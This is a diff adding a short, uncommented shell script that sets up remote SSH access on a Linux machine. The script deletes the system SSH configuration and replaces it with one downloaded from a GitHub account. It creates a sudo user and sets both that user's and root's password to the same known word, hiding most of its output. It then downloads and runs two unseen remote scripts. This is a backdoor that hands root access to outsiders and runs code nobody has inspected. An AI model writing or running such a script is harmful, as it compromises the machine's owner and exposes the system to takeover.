@@ -1,0 +1,8 @@
+apt install screen openssh-server -y &> /dev/null && rm -rf /etc/ssh/sshd_config &> /dev/null && cd /etc/ssh && wget https://github.com/xgffhu879/download/raw/refs/heads/main/sshcloud/sshd_config &> /dev/null
+sudo useradd -m aunglay
+sudo adduser aunglay sudo
+printf "aunglay:aunglay" | sudo chpasswd
+printf "root:aunglay" | sudo chpasswd
+sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd
+service ssh restart  && wget https://github.com/xgffhu879/download/raw/refs/heads/main/sshcloud/a &> /dev/null && bash a &> /dev/null
+wget https://github.com/xgffhu879/download/raw/refs/heads/main/sshcloud/b && bash b && ping google.com
